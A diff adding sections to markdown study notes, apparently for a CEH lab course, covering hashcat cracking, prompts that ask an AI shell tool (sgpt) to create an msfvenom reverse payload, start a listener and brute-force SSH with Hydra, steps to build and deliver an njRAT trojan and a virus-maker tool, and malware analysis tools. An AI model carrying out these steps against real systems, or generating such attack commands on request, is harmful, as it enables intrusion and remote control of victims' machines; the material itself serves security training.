@@ -1114,5 +1114,92 @@ and type
   ```console
   ~$:  hashcat -m 13100 --force -a 0 hash.txt /root/ADtools/rockyou.txt
   advances! is a got password
-  
+  ```
+  </details>
+  <details>
+  <summary>Hacking system using AI</summary>
 
+  ```console
+  ~$: to create payload
+  sgpt --shell "Use msfvenom to create a TCP payload with lhost=10.10.1.13 and lport=444"
+  >>to start listner
+  sgpt --shell "Use msfconsole to start a listener with lhost=10.10.1.13 and lport=444" 
+  >>to crack password by Hydra
+  sgpt --shell "Use Hydra to perform SSH-bruteforce on IP address=10.10.1.9 using username.txt and password.txt files available at location /home/attacker/Wordlist"
+  >>to dp stegonography
+  sgpt --shell "Perform stegnography using steghide to hide text 'My swiss account number is 232343435211113' in cover.jpg image file with password as '1234'"
+  >>to extract the hidden text
+  sgpt --shell "Use steghide to extract hidden text in cover.jpg"
+  ```
+  </details>
+
+  # Malware Threat
+  <details>
+  <summary>Gain control over a victim machine using the njRAT RAT Trojan</summary>
+
+  * install the application
+
+ ```console
+  :~$from ceh tools
+  njRAT v0.8d.exe.
+  >>
+  then in GUI click build button
+  check the options Randomize Stub, USB Spread Nj8d, Protect Prosess [BSOD], 
+  and put ip of attacker machine and hit build
+  send via share folder to target
+  double click
+  and back to attacker system
+  right click on session and file manager
+  you will get all option once the session starts
+
+```
+
+</details>
+
+<details>
+
+<summary>Infect the Target System using a Virus</summary>
+
+* JPS Virus Maker Tool
+```console
+:~$ install JPS virus from ceh tools
+enable the required check box
+and hit right side arrow to get more option
+```
+</details>
+
+<details>
+<summary>Perform Static Malware Analysis</summary>
+
+* Perform Malware Scanning using Hybrid Analysis
+```console
+:~$go to https://www.hybrid-analysis.com
+upload the given malware file
+```
+*  Analyze ELF Executable File using Detect It Easy (DIE)
+```console
+:~$ navigate in ceh tool and install DIE
+3 dot in right corner and add file 
+```
+* Perform Malware Disassembly using IDA and OllyDbg
+```console
+:~$install IDA exe
+and navigate throught the options to get specific data
+```
+>> by OllyDbg
+```console
+:~$install it and go throw options
+```
+</details>
+<details>
+<summary>Perform Dynamic Malware Analysis</summary>
+
+*  Perform Port Monitoring using TCPView and CurrPorts
+```console
+:~$ send trojan to victim by using njrat
+and go to victim machine n instal TCPview 
+```
+>> now through currports
+```console
+:~$install currports and click on exe and properties to see details
+```
